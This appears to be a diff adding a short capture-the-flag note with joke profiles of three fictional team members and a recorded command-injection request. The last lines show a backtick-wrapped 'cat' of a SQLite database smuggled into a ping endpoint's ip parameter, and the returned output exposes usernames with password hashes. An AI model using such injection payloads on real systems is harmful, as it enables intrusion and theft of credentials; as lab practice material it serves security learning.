@@ -1,0 +1,21 @@
+John McFamicom | r00t
+
+A web 3.0 full stack rockstar coder.
+CSS and HTML expert.
+
+
+
+Francois LeMytho | P4c0
+
+One of the best designer in the whole world.
+Expert in Photoshop CS2 and Paint.NET.
+
+
+Alvaro Squalo | Sq4l
+
+Young, rich and successful entrepreneur.
+Forbes top 8B.
+
+
+http://10.10.196.3:8081/ping?ip=`cat%20utech.db.sqlite`
+ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded 
